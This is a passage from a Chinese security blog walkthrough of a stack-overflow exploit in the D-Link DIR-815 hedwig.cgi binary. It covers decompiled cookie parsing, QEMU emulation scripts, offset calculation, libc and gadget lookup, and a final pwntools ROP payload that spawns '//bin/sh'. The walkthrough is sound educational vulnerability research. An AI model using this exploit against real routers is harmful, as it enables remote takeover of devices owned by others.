getenv(<span class="string">&quot;HTTP_COOKIE&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  cookie_cp = cookie;</span><br><span class="line">  <span class="keyword">if</span> ( !cookie )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  opt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ch = *cookie_cp;</span><br><span class="line">    <span class="keyword">if</span> ( !*cookie_cp )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( opt == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    <span class="keyword">if</span> ( opt &lt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ch == <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      sobj_free(v2);</span><br><span class="line">      sobj_free(v4);</span><br><span class="line">LABEL_11:</span><br><span class="line">      <span class="keyword">if</span> ( ch == <span class="string">&#x27;;&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        opt = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        opt = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( ch != <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          sobj_add_char(v2, ch);</span><br><span class="line">          opt = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opt == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ch == <span class="string">&#x27;;&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        opt = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      &#125;</span><br><span class="line">      sobj_add_char(v4, *cookie_cp++);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opt = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !sobj_strcmp(v2, <span class="string">&quot;uid&quot;</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">LABEL_18:</span><br><span class="line">      ++cookie_cp;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !sobj_strcmp(v2, <span class="string">&quot;uid&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_21:</span><br><span class="line">    <span class="built_in">string</span> = sobj_get_string(v4);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_27:</span><br><span class="line">  <span class="built_in">string</span> = getenv(<span class="string">&quot;REMOTE_ADDR&quot;</span>);</span><br><span class="line">LABEL_22:</span><br><span class="line">  sobj_add_string(a1, <span class="built_in">string</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">    sobj_del(v2);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    sobj_del(v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过分析，cookie的格式应该是 <code>uid=payload</code>，我们继续查找交叉引用，找到 <code>hedwigcgi_main</code> 函数，且该函数仅被 <code>main</code> 函数调用，那么我们就分析 <code>hedwigcgi_main</code> 函数。</p>
<p>首先是对POST协议的检查：</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240428185639756.png" alt="image-20240428185639756"></p>
<p>然后发现在调用了 <code>sess_get_uid</code> 后面，跟了一个 <code>sprintf</code> 函数，可能这个 <code>sprintf</code> 函数就是该漏洞的关键了。</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240428185712376.png" alt="image-20240428185712376"></p>
</li>
<li><p>动态调试</p>
<p>我们首先要确定偏移，利用之前的脚本先生成2000长度的 test_cookie </p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ep@ep-ubuntu23:~/Desktop/IOTWorkspace/DIR-815FW/_firmware.bin.extracted/squashfs-root$ python3 patternLocOffset.py -c -l 2000 -f test_cookie</span><br><span class="line">[*] Create pattern string contains 2000 characters</span><br><span class="line">[+] output to test_cookie</span><br><span class="line">[+] take time:  0.0005 </span><br></pre></td></tr></table></figure>
<p>程序是通过 <code>getenv</code> 函数来获取 HTTP 包中的数据的，流程如下：</p>
<ul>
<li>web程序监听</li>
<li>HTTP包传送</li>
<li>HTTP包中的header等数据通过环境变量的方式写入 cgi</li>
<li>cgibin 程序通过 getenv 函数获取数据并处理</li>
<li>返回相应的数据</li>
</ul>
<p>因此我们想要动态调试 cgibin 程序，只要用 <code>-E</code> 添加环境变量即可模拟对应的 web 场景，脚本如下 <code>test_cgi.sh</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>=$(python -c <span class="string">&quot;print &#x27;uid=&#x27;+open(&#x27;test_cookie&#x27;,&#x27;r&#x27;).read(2000)&quot;</span>)</span><br><span class="line">LEN=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$test</span>&quot;</span> | <span class="built_in">wc</span> -c)</span><br><span class="line">PORT=<span class="string">&quot;1234&quot;</span></span><br><span class="line"><span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu</span><br><span class="line">sudo <span class="built_in">chroot</span> . ./qemu -E CONTENT_LENGTH=<span class="variable">$LEN</span> -E CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> -E HTTP_COOKIE=<span class="variable">$test</span> -E REQUEST_URL=<span class="string">&quot;/hedwig.cgi&quot;</span> -E REMOTE_ADDR=<span class="string">&quot;127.0.0.1&quot;</span> -g <span class="variable">$PORT</span> /htdocs/web/hedwig.cgi 2&gt;/dev/null</span><br><span class="line"><span class="built_in">rm</span> -f ./qemu</span><br></pre></td></tr></table></figure>
<p>在 <code>/squashfs-root</code> 目录下运行，在IDA中设置动调参数即可开启动态调试。</p>
<p>程序运行过 <code>sprintf</code> 函数后到达如下位置</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240429185333602.png" alt="image-20240429185333602"></p>
<p>观察RA寄存器的值，停在了 <code>0x38694237</code> ，我们可以根据这个来计算偏移</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240429185120720.png" alt="image-20240429185120720"></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ep@ep-virtual-machine:~/Desktop/IOT/DIR-815/_firmware.bin.extracted/squashfs-root$ python patternLocOffset.py -s 0x38694237 -l 2000</span><br><span class="line">[*] Create pattern string contains 2000 characters</span><br><span class="line">ok!</span><br><span class="line"></span><br><span class="line">[+] Possible match at offset 1043 (adjusted another-endian)</span><br><span class="line">[+] take time: 0.0005 s</span><br></pre></td></tr></table></figure>
</li>
<li><p>第二个溢出点，这里同样是取 uid 的值进行格式化输出，且如果执行成功会覆盖前面的结果，则偏移会发生变化</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240429191855478.png" alt="image-20240429191855478"></p>
<p>分析流程如何走到该溢出点</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240504155903230.png" alt="image-20240504155903230"></p>
<p>发现需要同时满足这两个条件</p>
<p>我们先在 <code>var</code> 目录下创建所需的文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> var/tmp</span><br><span class="line"><span class="built_in">touch</span> var/tmp/temp.xml</span><br><span class="line"><span class="built_in">ls</span> var/tmp</span><br></pre></td></tr></table></figure>
<p>对于 <code>haystack</code> 这个变量，我们查找交叉引用，发现如下函数</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240504160826044.png" alt="image-20240504160826044"></p>
<p>调用位置</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240504160814895.png" alt="image-20240504160814895"></p>
<p><code>cgibin_parse_request</code> 函数根据 <code>CONTENT_TYPE</code> 来进行函数调用</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240504161312747.png" alt="image-20240504161312747"></p>
<p>结构体如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000 func_stru struc  # (sizeof=0xC, mappedto_21)</span><br><span class="line">00000000                                          # XREF: .data.rel.ro:stru_42C014/r</span><br><span class="line">00000000                                          # .data.rel.ro:0042C020/r ...</span><br><span class="line">00000000 name:.word ?                             # offset (00000000)</span><br><span class="line">00000004 len:.word ?</span><br><span class="line">00000008 addr:.word ?                             # offset (00000000)</span><br><span class="line">0000000C func_stru ends</span><br></pre></td></tr></table></figure>
<p>结合我们环境变量是 <code>CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</code>，执行的是 <code>sub_403B10</code> 函数，第一个参数是<code>sub_409A6C</code> 的地址</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240504163332082.png" alt="image-20240504163332082"></p>
<p>然后执行了 <code>sub_402FFC</code> 也是第一个传参是 <code>sub_409A6C</code> 的地址，这里好像偏移有点问题</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240504164817562.png" alt="image-20240504164817562"></p>
<p>这里把 a1 传给了 <code>max_size</code> ，但是分析后面的 <code>sub_402B40</code> 会发现，</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240504164902914.png" alt="image-20240504164902914"></p>
<p>函<code>a1-&gt;field_4</code>不为空，就会调用 <code>a1-&gt;max_size</code>，也就是我们传入的 <code>sub_409A6C</code> 函数指针，进而给<code>haystack</code> 赋值，因此我们随便写点就行</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">INPUT=<span class="string">&quot;x=x&quot;</span></span><br><span class="line">COOKIE=$(python -c <span class="string">&quot;print &#x27;uid=&#x27; + open(&#x27;test_cookie&#x27;,&#x27;r&#x27;).read()&quot;</span>)</span><br><span class="line">PORT=<span class="string">&quot;23946&quot;</span></span><br><span class="line">LEN=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$INPUT</span>&quot;</span> | <span class="built_in">wc</span> -c)</span><br><span class="line"><span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$INPUT</span> | <span class="built_in">chroot</span> . ./qemu -E CONTENT_LENGTH=<span class="variable">$LEN</span> -E CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> -E HTTP_COOKIE=<span class="variable">$COOKIE</span> -E REQUEST_URI=<span class="string">&quot;/hedwig.cgi&quot;</span> -E REMOTE_ADDR=<span class="string">&quot;127.0.0.1&quot;</span>  -g <span class="variable">$PORT</span> /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="built_in">rm</span> -f ./qemu</span><br></pre></td></tr></table></figure>
<p>运行后，RA 被覆盖成了 <code>0x68423668</code></p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240504171430192.png" alt="image-20240504171430192"></p>
<p>计算偏移</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ep@ep-virtual-machine:~/Desktop/IOT/DIR-815/_firmware.bin.extracted/squashfs-root$ python patternLocOffset.py -s 0x68423668 -l 2000</span><br><span class="line">[*] Create pattern string contains 2000 characters</span><br><span class="line">ok!</span><br><span class="line"></span><br><span class="line">[+] Possible match at offset 1009 (adjusted another-endian)</span><br><span class="line">[+] take time: 0.0006 s</span><br></pre></td></tr></table></figure>
</li>
<li><p>构造 ROP 链</p>
<p>从 <code>lib</code> 文件夹中找到 <code>libc.so.0</code></p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240504232026249.png" alt="image-20240504232026249"></p>
<p>ida 打开，搜索 <code>system</code> 函数</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240504174047087.png" alt="image-20240504174047087"></p>
<p>函数偏移为 <code>0x53200</code>，由于这里的libc.so.0库是动态连接库，需要找到libc.so.0的基地址，通过动态调试可以直接获取</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240504225228601.png" alt="image-20240504225228601"></p>
<p>基址为 <code>0x7F7E9000</code>，加上基址为 <code>0x7F83C200</code>，或者通过 <code>pwntools</code> 也可以获取偏移：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./lib/libc.so.0&quot;</span>)</span><br><span class="line">libc.address = <span class="number">0x7F7E9000</span> <span class="comment"># base address</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;system address: 0x<span class="subst">&#123;system_addr:x&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ep@ep-virtual-machine:~/Desktop/IOT/DIR-815/_firmware.bin.extracted/squashfs-root$ python3 get_system_address.py</span><br><span class="line">[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)</span><br><span class="line">[*] <span class="string">&#x27;/home/ep/Desktop/IOT/DIR-815/_firmware.bin.extracted/squashfs-root/lib/libc.so.0&#x27;</span></span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">[+] system address: 0x7f83c200</span><br></pre></td></tr></table></figure>
<p>那么要覆盖的地址就是 <code>0x7f83c200</code> 了，我们找一个 gadget ，试试这个 <code>0x159CC</code></p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240504232250511.png" alt="image-20240504232250511"></p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240504233647745.png" alt="image-20240504233647745"></p>
<p>这段 gadget 先把参数写到 <code>$s5</code> 里，再写入 <code>$a0</code> 作为第一个参数，然后再调用 <code>$s0</code> 指向的地址，因此我们可以把 cmd 写入<code>$a0</code> 中，地址写入 <code>$s0</code> 中，但是这里有一个问题，最后的一个字节是 <code>0x00</code>，而 HTTP_COOKIE 在传递的时候也没有编码，因此为了防止截断，需要把这个基址 <code>-1</code>，然后再找一个 <code>addiu</code> 加上来避免截断，写入时用 <code>0x7F83C200 - 1 = 0x7F83C1FF</code>，我们用 <code>mipsrop.find(&quot;addiu $s0, 1&quot;)</code> 来找</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240504234348636.png" alt="image-20240504234348636"></p>
<p>这个 gadget 可以控制 <code>$s0</code> 然后通过 <code>$s5</code> 跳转，注意到 <code>hedwigcgi_main</code> 最后对这些寄存器进行了赋值操作，也就是说，<code>$s0-$s7, $fp, $ra</code> 我们都可以控制，由前面的计算 <code>dest</code> 和 <code>0x4C0+var_s24</code> 的偏移为 <code>1009</code>，那么离 <code>0x4C0+var_s0</code>  的偏移就是 973</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240504234527131.png" alt="image-20240504234527131"></p>
<p>有了这些信息就可以构造 ROP 了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">base_offset = <span class="number">0x7F7E9000</span> <span class="comment"># 基址</span></span><br><span class="line">system_addr = <span class="number">0x53200</span> <span class="comment"># system 函数地址</span></span><br><span class="line">jmp_system_addr = <span class="number">0x159CC</span> <span class="comment"># jalr $s5 地址</span></span><br><span class="line">calc_addr = <span class="number">0x158B0</span> <span class="comment"># addiu $s0, 1 地址</span></span><br><span class="line">cmd = <span class="string">b&#x27;//bin/sh&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">973</span> <span class="comment"># padding</span></span><br><span class="line">payload += p32(system_addr + base_offset - <span class="number">1</span>) <span class="comment"># 覆盖 $s0, </span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">16</span></span><br><span class="line">payload += p32(jmp_system_addr + base_offset)</span><br><span class="line">payload += <span class="string">b&#x27;C&#x27;</span> * <span class="number">12</span></span><br><span class="line">payload += p32(calc_addr + base_offset)</span><br><span class="line">payload += <span class="string">b&#x27;D&#x27;</span> * <span class="number">16</span></span><br><span class="line">payload += cmd <span class="comment"># 覆盖局部变量</span></span><br><span class="line">payload += <span class="string">b&#x27;E&#x27;</span> * <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
</ol>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://example.com">EPs1l0h</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://example.com/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/">https://example.com/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://example.com" target="_blank">EPs1l0h's Castle</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/05/25/%E9%93%81%E4%B8%892024-re/"><img class="prev-cover" src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover2.jpg?raw=true" onerror="onerror=null;src='/img/404.gif'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">铁三2024-re</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/22/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/"><img class="next-cover" src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true" onerror="onerror=null;src='/img/404.gif'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">安卓逆向初探</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">EPs1l0h</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">50</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/EPs1l0h"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Spears shall be shaken! Shields shall be splintered! A sword day! A red day! Ere the sun rises!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%89%8D%E7%BD%AE%E8%8A%9D%E5%A3%AB"><span class="toc-number">1.</span> <span class="toc-text">一些前置芝士</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text">环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#binwalk"><span class="toc-number">2.1.</span> <span class="toc-text">binwalk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83"><span class="toc-number">2.2.</span> <span class="toc-text">交叉编译环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QEMU"><span class="toc-number">2.3.</span> <span class="toc-text">QEMU</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu-user-mode"><span class="toc-number">2.3.1.</span> <span class="toc-text">qemu-user-mode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu-system-mode"><span class="toc-number">2.3.2.</span> <span class="toc-text">qemu-system-mode</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E6%AC%A1-MIPS-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E5%AE%9E%E8%B7%B5"><span class="toc-number">3.</span> <span class="toc-text">一次 MIPS 缓冲区溢出利用实践</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Crash"><span class="toc-number">3.1.</span> <span class="toc-text">Crash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E8%A6%86%E7%9B%96saved-ra%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%BF%9B%E8%80%8C%E8%A6%86%E7%9B%96RA%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">3.2.</span> <span class="toc-text">栈溢出覆盖saved_ra局部变量进而覆盖RA寄存器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%BC%80%E5%8F%91%E8%BF%87%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞利用开发过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81PC"><span class="toc-number">3.3.1.</span> <span class="toc-text">劫持PC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB"><span class="toc-number">3.3.2.</span> <span class="toc-text">确定偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%94%BB%E5%87%BB%E9%80%94%E5%BE%84"><span class="toc-number">3.3.3.</span> <span class="toc-text">确定攻击途径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 